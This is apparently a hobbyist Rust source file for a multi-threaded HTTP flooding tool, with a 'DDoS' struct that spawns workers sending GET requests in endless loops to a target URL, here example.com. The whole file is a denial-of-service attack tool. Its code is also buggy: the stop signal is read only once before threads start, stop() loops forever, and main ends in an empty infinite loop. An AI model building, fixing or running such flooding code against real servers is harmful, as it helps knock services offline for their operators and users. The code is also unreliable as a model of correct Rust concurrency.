#![feature(async_closure)]

use std::error::Error;
use std::{thread, time, fmt,ptr};
use futures::future::Future;
use url::{Url, ParseError};
use reqwest;
use std::io::Read;
use tokio::{prelude::*, runtime::Runtime};
use std::time::*;
use std::sync::mpsc;
// macro_rules! unwrap_or_return {
//     ( $e:expr ) => {
//         match $e {
//             Ok(x) => x,
//             Err(_) => return,
//         }
//     }
// }

#[derive(Debug)]
struct DDosError {
    details: String
}

impl DDosError {
    fn new(msg: &str) -> DDosError {
        DDosError{details: msg.to_string()}
    }
}

impl fmt::Display for DDosError {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(f,"{}",self.details)
    }
}

impl Error for DDosError {
    fn description(&self) -> &str {
        &self.details
    }
}
// #[derive(Copy,Clone)]
struct DDoS {
    url: Url,
    stop: mpsc::Receiver<bool>,
    sender: mpsc::Sender<bool>,
    amount_workers: i64
}
fn build_url(s: &str) -> Result<Url,ParseError> {
    println!("{}", s);
    let url = Url::parse(s)?;
    Ok(url)
}
#[tokio::main]
async fn make_request(url: &String) -> Result<(), reqwest::Error> {
        let res = reqwest::get(url).await?;
        println!("{:?}", url);
        println!("{:?}",res.status());
        let body = res.text().await?;

        println!("Made request");
        Ok(())
}
impl DDoS {
    fn new(url: &str, workers: i64) -> Result<DDoS, DDosError> {
        if workers < 1 {
            return Err(DDosError::new("Not enough workers."));
        }
        let data_url = build_url(url).unwrap();
        println!("{:?}",data_url );
        if data_url.host() == None {
            return Err(DDosError::new("Undefined host."));
        }
        let (sender, receiver) = mpsc::channel();
        Ok(DDoS {
            url: data_url,
            stop: receiver,
            sender: sender,
            amount_workers: workers
        })

    }
    fn stop(&self) {

        let clone_sender = &self.sender.clone();
        for _ in 0..self.amount_workers {
            println!("STOPP");
            loop {

                    clone_sender.send(true).unwrap();
                }
          }
    }
    fn run(&mut self) {
        let local_workers = self.amount_workers.clone();
        for _ in 0..local_workers {
            let url = self.url.clone().to_string();
            println!("{:?}",url );
            let should_stop = self.stop.try_iter().next();
            println!("Otside of thread {:?}",should_stop );
            thread::spawn(move || {
                println!("{:?}",should_stop );
                println!("In new thread");
                loop {
                    if should_stop == Some(true) {
                        break;
                    }
                    make_request(&url);
                }
            });
        }

    }
}
fn main() {
    let mut ddos: DDoS = DDoS::new("http://example.com", 2).unwrap();
    ddos.run();
    thread::sleep(Duration::from_millis(4000));
    ddos.stop();

    loop {

        // thread::sleep(Duration::from_millis(5000));
    }
}
